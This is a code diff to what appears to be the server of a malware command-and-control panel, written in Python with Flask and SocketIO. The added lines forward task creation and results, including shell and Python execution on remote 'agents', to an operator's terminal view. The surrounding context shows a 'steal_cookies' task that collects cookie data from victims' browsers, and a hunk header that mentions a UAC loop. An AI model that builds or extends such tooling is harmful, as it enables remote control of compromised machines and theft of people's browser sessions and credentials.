@@ -1129,6 +1129,14 @@ result = "UAC loop started"
                 'task_type': data['task_type']
             })
             
+            # Notify terminal about task creation
+            socketio.emit('terminal_output', {
+                'agent_id': data['agent_id'],
+                'output': f'[*] Task created: {data["task_type"]} (ID: {task_id})',
+                'task_type': data['task_type'],
+                'task_id': task_id
+            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+            
             return jsonify({
                 "status": "success", 
                 "task_id": task_id
@@ -1168,6 +1176,32 @@ result = "UAC loop started"
                         WHERE id=?''', 
                     (datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , data['task_id']))
             
+            # Universal terminal output for all task completions
+            result_data = data.get('result', {})
+            term_msg = {
+                'agent_id': data['agent_id'],
+                'task_id': data['task_id'],
+                'task_type': data['task_type'],
+                'current_dir': result_data.get('current_dir', '') if isinstance(result_data, dict) else ''
+            }
+
+            if data['task_type'] in ['terminal', 'shell', 'execute_python']:
+                if isinstance(result_data, dict):
+                    term_msg['command'] = result_data.get('command', '')
+                    term_msg['output'] = result_data.get('output', result_data.get('message', ''))
+                    term_msg['error'] = result_data.get('error', '')
+                else:
+                    term_msg['output'] = str(result_data)
+            else:
+                s_status = 'completed'
+                s_msg = f"Task {data['task_type']} finished"
+                if isinstance(result_data, dict):
+                    s_status = result_data.get('status', 'completed')
+                    s_msg = result_data.get('message', f"Task {data['task_type']} finished")
+                term_msg['output'] = f"[+] {data['task_type'].upper()} task completed: {s_msg} ({s_status})"
+
+            socketio.emit('terminal_output', term_msg, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+
             # Handle different task types
             if data['task_type'] == 'steal_cookies' and data.get('result') and data['result'].get('results'):
                 app.logger.info(f"Processing cookie data from {len(data['result']['results'])} browsers")
